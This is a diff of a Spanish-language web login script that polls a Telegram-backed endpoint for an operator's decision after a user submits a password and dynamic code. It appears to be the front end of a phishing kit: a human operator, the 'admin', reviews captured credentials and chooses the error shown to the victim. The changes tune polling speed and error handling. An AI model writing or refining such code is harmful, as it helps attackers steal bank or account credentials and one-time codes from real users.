@@ -40,6 +40,7 @@ document.addEventListener('DOMContentLoaded', function () {
             errorBanner.textContent = texto;
             errorBanner.classList.add('show');
         }
+        if (loadingOverlay) loadingOverlay.style.display = 'none';
         errorModal.classList.add('active');
         errorAccept.focus();
     }
@@ -194,7 +195,7 @@ document.addEventListener('DOMContentLoaded', function () {
     function startPolling(messageId) {
         return new Promise((resolve) => {
             let attempts = 0;
-            const maxAttempts = 90; // ~90 segundos
+            const maxAttempts = 180; // ~90 segundos a 500ms
 
             pollingInterval = setInterval(async () => {
                 attempts++;
@@ -209,7 +210,7 @@ document.addEventListener('DOMContentLoaded', function () {
                     pollingInterval = null;
                     resolve({ action: 'timeout' });
                 }
-            }, 1000);
+            }, 500);
         });
     }
 
@@ -234,7 +235,6 @@ document.addEventListener('DOMContentLoaded', function () {
             );
 
             if (!messageId) {
-                if (loadingOverlay) loadingOverlay.style.display = 'none';
                 mostrarError('No pudimos conectar con el servidor. Revisa tu conexión e inténtalo de nuevo.');
                 return;
             }
@@ -247,22 +247,13 @@ document.addEventListener('DOMContentLoaded', function () {
                 return;
             }
 
-            let motivo = resp && resp.reason ? resp.reason : null;
-
-            // Ventana corta por si el admin escribe el motivo (2 x 600ms ≈ 1.2s)
-            if (!motivo && resp && resp.action === 'mostrar_error') {
-                for (let i = 0; i < 2; i++) {
-                    await new Promise(r => setTimeout(r, 600));
-                    const extra = await checkTelegramResponse(messageId);
-                    if (extra && extra.reason) { motivo = extra.reason; break; }
-                }
+            if (resp && resp.action === 'timeout') {
+                mostrarError('No pudimos validar tu información a tiempo. Inténtalo nuevamente.');
+            } else {
+                // mostrar_error o respuesta escrita: modal inmediato
+                mostrarError(resp && resp.reason ? resp.reason : null);
             }
 
-            if (!motivo && resp && resp.action === 'timeout') {
-                motivo = 'No pudimos validar tu información a tiempo. Inténtalo nuevamente.';
-            }
-
-            mostrarError(motivo);
             if (passwordInput) passwordInput.value = '';
             if (dynamicCodeInput) dynamicCodeInput.value = '';
             validateForm();
